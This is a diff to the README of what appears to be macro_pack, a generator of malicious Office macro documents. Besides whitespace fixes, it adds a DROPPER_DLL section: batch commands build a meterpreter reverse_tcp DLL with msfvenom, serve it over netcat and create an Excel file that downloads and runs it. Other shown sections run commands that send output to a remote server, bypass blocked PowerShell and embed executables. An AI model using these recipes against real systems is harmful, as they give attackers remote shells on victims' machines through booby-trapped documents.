@@ -260,7 +260,7 @@ Give this template the name or email of the author
 ### CMD
 Execute a command line and send result to remote http server  
 Give this template the server url and the command to run  
-   -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | macro_pack.exe -t CMD -o -G cmd.doc``` 
+  -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | macro_pack.exe -t CMD -o -G cmd.doc``` 
    
 ```bash
 # Catch result with any webserver or netcat
@@ -283,14 +283,27 @@ Give this template the file url and the target file path.
 Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe).  
 Note: This payload will download PowerShdll from Github.  
 Give this template the url of the powershell script you want to run  
- -> Example:  ```echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc```
-  
+  -> Example:  ```echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc```
+ 
+ 
+### DROPPER_DLL
+Download a DLL with another extension and run it using Office VBA 
+  -> Example, load meterpreter DLL using Office:  
+```batch
+REM Generate meterpreter dll payload
+msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
+REM Make it available on webserver, ex using netcat on port 6666
+{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
+REM Create OFfice file which will download DLL and call it
+REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
+echo "http://192.168.0.5:6666/normal.html" Run | macro_pack.exe -t DROPPER_DLL -o -G meterdll.xls
+```
         
 ### METERPRETER  
 Meterpreter reverse TCP template using MacroMeter by Cn33liz.  
 This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw.  
 Give this template the IP and PORT of listening mfsconsole  
- -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm``` 
+  -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm``` 
  
 Recommended msfconsole options (use exploit/multi/handler):
 ```
@@ -310,8 +323,8 @@ Will encode an executable inside the vba. When macro is played, exe will be deco
 This template is inspired by https://github.com/khr0x40sh/MacroShop
 Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
 If extraction path is not given, exe will be extracted with random name in current path.  
- -> Example1: ```echo "path\\to\my_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
- -> Example2: ```echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
+  -> Example1: ```echo "path\\to\my_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
+  -> Example2: ```echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -G my_exe.xlsm```  
 
 
 ## Efficiency
@@ -339,6 +352,7 @@ Blog posts about MS Office security:
  - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
  - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  - https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
+ - https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
  
  Other useful links:
  - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
